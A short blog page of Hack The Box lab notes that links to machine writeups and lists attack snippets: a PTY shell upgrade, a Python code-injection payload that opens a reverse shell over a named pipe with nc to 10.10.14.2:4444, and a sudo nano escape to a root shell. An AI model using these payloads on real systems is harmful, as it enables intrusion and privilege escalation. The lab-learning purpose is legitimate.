---
title: "Highlights"
date: 2020-01-03T20:06:24-05:00
draft: false
---

# Writeups
[Postman](../../post/htb/postman)
[Craft](../../post/htb/craft)
[Sneaky - Coming Soon](../../post/htb/sneaky)
[Traverxec - Coming Soon](../../post/htb/traverxec)

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

```python
__import__("os"); os.system("pwd")
```

**python code injection w/import and backpiping**

```bash
__import__("os").system("mknod /tmp/backpipe2 p && /bin/sh 0</tmp/backpipe2 | nc 10.10.14.2 4444 1>/tmp/backpipe2")
```

![test image](/img/craft/developer.png)

# Nano Escape

Opening nano as sudo we can then perform:
```bash
^R^X
Reset; sh 1>&0 2>&0
```
Where ^R^X is ctrl+R and ctrl+X.
